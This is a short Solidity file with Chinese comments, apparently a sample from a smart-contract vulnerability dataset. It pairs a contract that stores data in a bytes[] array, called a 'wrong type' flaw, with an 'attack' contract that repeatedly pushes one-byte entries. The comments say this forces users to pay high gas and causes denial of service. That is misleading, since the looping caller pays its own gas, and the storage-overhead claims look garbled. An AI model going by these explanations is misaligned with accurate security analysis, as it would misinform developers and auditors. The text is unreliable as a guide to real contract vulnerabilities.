pragma solidity >=0.8.0;

// Vulnerable Code: Wrong Type in Variable Declaration
// 此合約使用 bytes[] 型態存放資料，每個元素會預留額外記憶體空間（31 bytes/元素），導致 gas 消耗增加。
contract VulnerableSampleBytesArray {
    // 狀態變數使用錯誤的資料型態：每個元素皆為 bytes 類型，但陣列本身非連續儲存，造成不必要的記憶體浪費。
    bytes[] public simBytes;

    // 函式：新增資料到 simBytes 陣列中
    function addSimBytes(bytes calldata _data) external {
        // 將傳入的位元組資料推入陣列中
        simBytes.push(_data);
    }

    /*
    攻擊示例說明：
    1. 攻擊者可以呼叫 addSimBytes() 多次，讓每筆資料因為錯誤的資料型態而消耗額外的 gas。
    2. 雖然此漏洞不是直接竊取資金，但在大規模操作下會導致網路資源浪費，甚至可能造成部分操作的拒絕服務 (DoS)。
    */
}

// 攻擊合約範例
contract AttackVulnerable {
    VulnerableSampleBytesArray public vulnerableContract;

    // 部署時必須傳入 VulnerableSampleBytesArray 的合約地址
    constructor(address _vulnerable) {
        vulnerableContract = VulnerableSampleBytesArray(_vulnerable);
    }

    // 攻擊函式：透過大量呼叫 addSimBytes 模擬一個惡意操作，強迫使用者支付極高的 gas 費
    function attack(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            // 傳入單一位元組資料，卻因為不必要的結構分配而消耗額外 gas
            vulnerableContract.addSimBytes(hex"00");
        }
    }
}